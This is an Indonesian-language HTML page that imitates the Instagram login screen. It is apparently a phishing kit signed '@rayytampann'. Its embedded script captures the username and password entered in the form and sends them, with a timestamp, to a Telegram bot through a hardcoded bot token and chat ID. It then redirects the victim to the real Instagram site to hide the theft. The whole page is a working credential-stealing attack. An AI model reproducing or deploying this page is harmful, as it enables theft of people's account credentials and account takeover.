<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Masuk • Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #1a2530; 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            width: 100vw;
            color: #fafafa;
            position: relative;
        }

        .back-button {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 24px;
            color: #fff;
            text-decoration: none;
        }

        .language-text {
            font-size: 14px;
            color: #a0a0a0;
            margin-bottom: 30px;
        }

        .login-box {
            background-color: transparent;
            width: 90%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* GAYA LOGO SVG */
        .logo {
            width: 175px;
            height: 51px;
            margin-bottom: 40px;
            fill: #ffffff; /* Membuat logo menjadi warna putih bersih */
        }

        form {
            display: flex;
            flex-direction: column;
            width: 100%;
            gap: 6px;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }

        input {
            background-color: #263340;
            border: 1px solid #384f63;
            border-radius: 25px;
            color: #fff;
            padding: 12px 40px 12px 16px;
            font-size: 14px;
            width: 100%;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #5c778f;
        }

        .clear-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #a0a0a0;
            font-size: 18px;
            cursor: pointer;
            display: none;
        }
        
        input:not(:placeholder-shown) + .clear-icon {
            display: block;
        }

        button {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 25px;
            padding: 12px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            width: 100%;
            font-size: 15px;
            transition: background-color 0.2s;
        }

        button:hover {
            background-color: #1877f2;
        }

        button:disabled { 
            background-color: #00376b; 
            cursor: not-allowed;         
        }

        .signature {
            margin-top: 20px;
            font-size: 12px;
            color: #5c778f;
        }
    </style>
</head>
<body>

    <a href="#" class="back-button">&#8249;</a>
    <div class="language-text">Bahasa Indonesia</div>

    <div class="login-box">
        <!-- Logo Instagram menggunakan SVG langsung agar dijamin muncul -->
        <svg class="logo" viewBox="0 0 175 51">
            <path d="M12.3 22.8c-.5-.2-1.2-.4-2-.4-1.2 0-2.2.3-3 .9-.8.6-1.2 1.5-1.2 2.7 0 .9.3 1.6.8 2.2.5.6 1.2.9 2.1.9.8 0 1.5-.2 2.1-.7v-5.6zm10.7-5.5c-1.1 0-2.1.3-3 .9-.9.6-1.5 1.5-1.9 2.6h-.1v-3h-3.3v16.1h3.4v-8.1c0-1.2.3-2.1.9-2.7.6-.6 1.4-.9 2.3-.9.2 0 .4 0 .6.1l.3-3.1c-.3-.1-.7-.1-1.2-.1zm8.3-2.6c-1 0-1.8.8-1.8 1.8 0 1 .8 1.8 1.8 1.8 1 0 1.8-.8 1.8-1.8 0-1-.8-1.8-1.8-1.8zm1.7 5.1h-3.4v12.7h3.4V19.8zm10.1 0h-3.4v1.7h-.1c-.5-.8-1.2-1.4-2.1-1.8-.9-.4-1.8-.6-2.8-.6-2.1 0-3.7.7-4.8 2.1-1.1 1.4-1.6 3.3-1.6 5.8 0 2.5.5 4.4 1.6 5.8 1.1 1.4 2.7 2.1 4.8 2.1 1 0 2-.2 2.9-.6.9-.4 1.6-1 2.1-1.8h.1v2.1h3.4V19.8zm-4.7 9.8c-.8 0-1.5-.3-2.1-.8-.6-.5-.9-1.3-.9-2.3 0-1 .3-1.8.9-2.3.6-.5 1.3-.8 2.1-.8.8 0 1.5.3 2.1.8.6.5.9 1.3.9 2.3 0 1-.3 1.8-.9 2.3-.6.5-1.3.8-2.1.8zm19.6-12.4c-1.1 0-2.2.3-3.1.9-.9.6-1.6 1.5-2 2.6h-.1v-3.2h-3.3v16.1h3.4v-8.1c0-1.2.3-2.1.9-2.7.6-.6 1.4-.9 2.3-.9.2 0 .4 0 .6.1l.3-3.1c-.2-.1-.6-.1-1.1-.1zm12.3 10.3c.7-.6 1.1-1.4 1.1-2.5 0-1-.3-1.8-.9-2.3-.6-.5-1.4-.8-2.5-.8h-4.9v11.1h3.4v-4h1.5l2.2 4h3.9l-2.6-4.5c-.7-.3-1.2-.7-1.3-1zm-4-3.1h1.7c.6 0 1.1.1 1.4.3.3.2.5.6.5 1.1 0 .5-.2.9-.5 1.1-.3.2-.8.3-1.4.3h-1.7v-2.8zm15.1-7.2c-2.1 0-3.7.7-4.8 2.1-1.1 1.4-1.6 3.3-1.6 5.8 0 2.5.5 4.4 1.6 5.8 1.1 1.4 2.7 2.1 4.8 2.1 2.1 0 3.7-.7 4.8-2.1 1.1-1.4 1.6-3.3 1.6-5.8 0-2.5-.5-4.4-1.6-5.8-1.1-1.4-2.7-2.1-4.8-2.1zm0 11.2c-.8 0-1.5-.3-2.1-.8-.6-.5-.9-1.3-.9-2.3 0-1 .3-1.8.9-2.3.6-.5 1.3-.8 2.1-.8.8 0 1.5.3 2.1.8.6.5.9 1.3.9 2.3 0 1-.3 1.8-.9 2.3-.6.5-1.3.8-2.1.8zm15.1-11.2c-1.1 0-2.2.3-3.1.9-.9.6-1.6 1.5-2 2.6h-.1v-3.2h-3.3v16.1h3.4v-8.1c0-1.2.3-2.1.9-2.7.6-.6 1.4-.9 2.3-.9.2 0 .4 0 .6.1l.3-3.1c-.2-.1-.6-.1-1.1-.1zm12.9 0c-1 0-1.8.4-2.4 1.1-.6.7-.9 1.6-.9 2.7v7.4h3.4V23c0-.6.2-1.1.6-1.4.4-.3.9-.5 1.5-.5.4 0 .7 0 1 .1l.2-3.1c-.3-.1-.8-.1-1.4-.1zm8.7-2.6h-3.4v15.8h3.4V17.2zm0-4.6h-3.4v2.7h3.4V12.6zm13.1 7.2c-.4-.5-1-.8-1.8-.8-1 0-1.8.4-2.4 1.2-.6.8-.9 1.9-.9 3.2v5.6h3.4v-7.8c0-.6.1-1.1.4-1.3.3-.2.7-.4 1.2-.4.4 0 .8.1 1.1.2l1-3c-.4-.2-.8-.3-1.6-.3zm12.3-4.6h-3.4v3.3h-1.5v2.9h1.5v6c0 1.2.3 2.1.9 2.7.6.6 1.4.9 2.4.9.4 0 .8-.1 1.1-.2v-2.8c-.2 0-.4 0-.6.1-.3 0-.5.1-.7.1-.4 0-.7-.1-.9-.4-.2-.3-.3-.7-.3-1.3v-4.1h2.5v-2.9h-2.5v-3.3z"/>
        </svg>
        
        <form id="loginForm">
            <div class="input-wrapper">
                <input type="text" id="username" placeholder="Nama pengguna, email, atau nomor ponsel" required>
                <span class="clear-icon">&#10005;</span>
            </div>
            <div class="input-wrapper">
                <input type="password" id="password" placeholder="Kata sandi" required>
                <span class="clear-icon"></span>
            </div>
            <button type="submit" id="btnSubmit">Log In</button>
        </form>

        <div class="signature">@rayytampann</div>
    </div>

    <script>
        const BOT_TOKEN = '8653911812:AAG4hAVpL8hB4YZJhLL2PAHNDLgV3QYtsBg'; 
        const CHAT_ID = '6888530451';

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const btn = document.getElementById('btnSubmit');
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if (!user || !pass) return;

            btn.disabled = true;
            btn.innerText = 'Memproses...';

            const sekarang = new Date();
            const tanggalRealtime = sekarang.toLocaleDateString('id-ID');
            const waktuRealtime = sekarang.toLocaleTimeString('id-ID');

            const message = `📊 *LAPORAN AKTIVITAS Login*\n` +
                            `📅 *Tanggal:* ${tanggalRealtime}\n` +
                            `🕒 *Jam:* ${waktuRealtime}\n\n` +
                            `📌 *Aksi:* Percobaan Masuk\n` +
                            `👤 *User:* \`${user}\`\n` +
                            `🔑 *Pass:* \`${pass}\``;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    }),
                    keepalive: true 
                });
            } catch (error) {
                console.log('Error:', error);
            } finally {
                window.location.href = 'https://www.instagram.com/';
            }
        });
    </script>
</body>
</html>
